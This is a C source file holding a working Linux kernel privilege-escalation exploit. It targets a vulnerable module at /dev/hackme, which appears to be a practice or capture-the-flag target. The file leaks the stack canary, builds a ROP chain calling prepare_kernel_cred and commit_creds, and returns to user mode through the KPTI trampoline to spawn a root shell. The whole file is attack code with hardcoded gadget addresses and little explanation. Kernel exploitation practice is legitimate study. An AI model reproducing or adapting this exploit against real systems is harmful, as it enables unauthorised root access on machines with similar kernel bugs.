#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

void shell();

int kernel_fd;
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long user_rip = (unsigned long) shell;

unsigned long pop_rdi = 0xffffffff81006370;
unsigned long push_rax = 0xffffffff81006070;
unsigned long mov_rdi_rax_pop_rbp = 0xffffffff816bf203;

unsigned long swapgs_pop_rbp = 0xffffffff8100a55f;
unsigned long iretq_pop_rbp = 0xffffffff814381cb;

unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;

unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10;

void shell() {
	int uid = getuid();
	printf("[*] uid: %d\n", uid);
	puts("[*] Spawning shell.");
	system("/bin/sh");
}

// open the vulnerable kernel module
void open_ko_file() {
	kernel_fd = open("/dev/hackme", O_RDWR);

	if (kernel_fd < 0) {
		printf("[!] Error opening kernel module\n");
		exit(-1);
	}

	printf("[*] Opened module\n");
}

unsigned long leak_canary () {
	// unsigned longs are 8 bytes each, buf is 0x80 bytes large
	// so canary will be at index 16
	unsigned long leak[20];

	int sz = read(kernel_fd, leak, sizeof(leak));

	for (int i = 0; i < 20; i++) {
		printf("[*] Leak at index %d: 0x%lx\n", i, leak[i]);	
	}

	printf("[*] Canary value: 0x%lx\n", leak[16]);

	return leak[16];
}


void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}


void overflow () {
	unsigned long payload[50];
	int offset = 16;

	/* 
	 * swapgs_restore_regs_and_return_to_usermode is a cool function that is clutch af
	 * the beginning has a lot of pop instructions so start at its address + 22
	 * it looks like this:
	 *
	 * mov rdi, rsp
	 * mov rsp, gs
	 * push [rdi + 0x30]
	 * push [rdi + 0x28]
	 * push [rdi + 0x20]
	 * push [rdi + 0x18]
	 * push [rdi + 0x10]
	 * push [rdi]
	 * push rax
	 * jmp swapgs
	 *
	 * and inside the swapgs address there will be this:
	 *
	 * pop rax
	 * pop rdi
	 * call swapgs
	 * jmp iretq
	 *
	 * legit this makes it even easier compared to before
	 * */

	payload[offset++] = leak_canary();
	payload[offset++] = 0x0; // rbx
	payload[offset++] = 0x0; // r12
	payload[offset++] = 0x0; // rbp
	payload[offset++] = pop_rdi;
	payload[offset++] = 0x0;
	payload[offset++] = prepare_kernel_cred;
	payload[offset++] = mov_rdi_rax_pop_rbp;
	payload[offset++] = 0x0;
	payload[offset++] = commit_creds;
	payload[offset++] = swapgs_restore_regs_and_return_to_usermode + 22;
	payload[offset++] = 0x0;
	payload[offset++] = 0x0;
	payload[offset++] = user_rip + 1;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;


	//payload[offset++] = (unsigned long) &escalate_privs; // ret
	puts("[*] Sending payload...");
	
	ssize_t w = write(kernel_fd, payload, sizeof(payload));

	puts("[!] This should never be reached");
}

int main() {
	save_state();
	open_ko_file();
	overflow();

	puts("[!] Something went wrong");
	return 0;
}
